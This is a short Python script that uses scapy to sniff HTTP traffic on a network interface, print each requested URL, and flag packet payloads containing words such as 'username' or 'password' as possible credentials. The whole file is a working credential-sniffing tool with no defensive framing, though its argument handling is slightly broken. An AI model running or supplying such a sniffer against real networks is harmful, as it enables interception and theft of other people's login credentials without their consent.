import scapy.all as scapy
from scapy_http import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--interface', dest="interface", help="interface to sniff packets through")
    options = parser.parse_args()
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "name", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load



def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n Possible username/password >" + login_info + "\n\n")

options = get_arguments()
interface = options.interface
sniff(interface)